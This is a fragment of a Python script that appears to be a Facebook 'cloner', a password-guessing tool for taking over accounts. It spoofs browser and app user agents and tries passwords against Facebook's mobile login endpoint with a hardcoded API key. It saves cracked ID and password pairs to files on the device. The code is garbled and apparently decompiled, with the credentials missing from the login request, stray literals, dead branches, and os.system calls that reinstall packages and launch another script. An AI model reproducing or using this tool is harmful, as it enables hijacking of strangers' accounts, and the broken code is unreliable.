            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36 RuxitSynthetic/1.0 v7947348214447361456 t144310210871017869 athe94ac249 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v5568270245907977979 t7585821862018737939 ath5ee645e0 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36 RuxitSynthetic/1.0 v3189397230650796646 t961549258186996299 athe94ac249 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36 RuxitSynthetic/1.0 v2616320717007221606 t6182751287436097174 athe94ac249 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904805165 t6539152303194725765 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904807001 t6703941201591042144 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v11899785813 t1198600188870445864 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904809638 t6006063806750198674 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36 RuxitSynthetic/1.0 v4315543732448381076 t6450448904627200820 ath2653ab72 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36 RuxitSynthetic/1.0 v874041507332283573 t6735075811151450244 ath2653ab72 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904817669 t3984374008602804876 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v5688176957245831372 t1872217365388251660 ath5ee645e0 altpriv cvcv=2 smf=0',
            '[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1184};FBLC/en_US;FBCR/Republic;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/XT1031;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]',
            '[FBAN/FB4A;FBAV/360.0.0.30.113;FBBV/359953991;FBDM/{density=1.5,width=1920,height=1176};FBLC/ru_RU;FBRV/362221362;FBCR/;FBMF/LENOVO;FBBD/Lenovo;FBPN/com.facebook.katana;FBDV/Lenovo TB-X606F;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]',
            'Mozilla/5.0 (Linux; Android 10; Pixel 4 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36 [FBAN/FB4A;FBAV/246.0.0.49.121;FBPN/com.facebook.katana;FBLC/en_US;FBBV/238093484;FBCR/;FBMF/Google;FBBD/Pixel;FBDV/Pixel 4 XL;FBSV/10;FBCA/arm64-v8a:;FBDM/{density=3.0,width=1440,height=2960};FB_FW/1;]',
            'Mozilla/5.0 (Linux; Android 9; Samsung Galaxy S9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36 [FBAN/FB4A;FBAV/210.0.0.41.110;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/123456789;FBCR/AT&T;FBMF/Samsung;FBBD/Samsung;FBDV/SM-G960U;FBSV/9;FBCA/arm64-v8a:;FBDM/{density=2.0,width=1080,height=1920};FB_FW/1;]',
            'Mozilla/5.0 (Linux; Android 8.1.0; Redmi Note 5 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36 [FBAN/FB4A;FBAV/220.0.0.43.121;FBPN/com.facebook.katana;FBLC/en_US;FBBV/234578937;FBCR/Verizon;FBMF/Xiaomi;FBBD/Redmi;FBDV/Note 5 Pro;FBSV/8.1.0;FBCA/arm64-v8a:;FBDM/{density=2.75,width=1080,height=2160};FB_FW/1;]',
            'Mozilla/5.0 (Linux; Android 7.0; Samsung Galaxy S7 Edge) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36 [FBAN/FB4A;FBAV/185.0.0.38.107;FBPN/com.facebook.katana;FBLC/en_US;FBBV/103525509;FBCR/Sprint;FBMF/Samsung;FBBD/Samsung;FBDV/SM-G935F;FBSV/7.0;FBCA/arm64-v8a:;FBDM/{density=4.0,width=1440,height=2560};FB_FW/1;]Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:117.0) Gecko/20100101 Firefox/117.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:116.0) Gecko/20100101 Firefox/116.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.69',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.88 Safari/537.36 Edg/117.0.2045.47',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 OPR/102.0.4880.56',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36 OPR/101.0.4865.21',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2']
        max = random.choice(ua_list)
        return str(max)

    def CloneOld(self, ids, passlist):
        sys.stdout.write(f'''\r\r\x1b[mSONU-404 {self.loop}|OLD|OK:{len(self.oks)}|CP:{len(self.cps)}''')
        sys.stdout.flush()
        for pas in passlist:
            data = {
                'api_key': '882a8490361da98702bf97a021ddc14d',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler' }
            head = {
                'x-fb-http-engine': 'Liger' }
            url = 'https://b-graph.facebook.com/auth/login'
            response = requests.post(url, data = data, headers = head, verify = True).json()
            if 'access_token' in response:
                print(f'''\r\r\x1b[1;33mSXT-OK • {ids} • {pas}''')
                open('/sdcard/SXT-OK.txt', 'a').write(ids + '|' + pas + '\n')
                self.oks.append(ids)
                'gzip, deflate'
            if 'www.facebook.com' in response['error']['message']:
                print(f'''\r\r\x1b[38;5;46mLOGIN WITH VPN • {ids} • {pas}''')
                open('/sdcard/SXT-VPN.txt', 'a').write(ids + '|' + pas + '\n')
                self.cps.append(ids)
                'accept-encoding'
        self.loop += 1
        self.some_property = 'graphservice'
        return None
        if Exception:
            e = 'X-FB-Request-Analytics-Tags'
            e = None
            del e
            return None
            e = None
            del e

class OLD_CLONER:
    def main(self):
        print("Running OLD_CLONER...")  # تنفيذ المهمة الرئيسية

if __name__ == '__main__':
    OLD_CLONER().main()  # تشغيل الدالة main في الكلاس OLD_CLONER

os.system('pip uninstall requests -y;pip install requests')
if not None:
    pass
if not None:
    pass
if not None:
    pass
if not None:
    pass
if ModuleNotFoundError:
    os.system('pip install mechanize requests futures==2 > /dev/null')
    os.system('python run.py')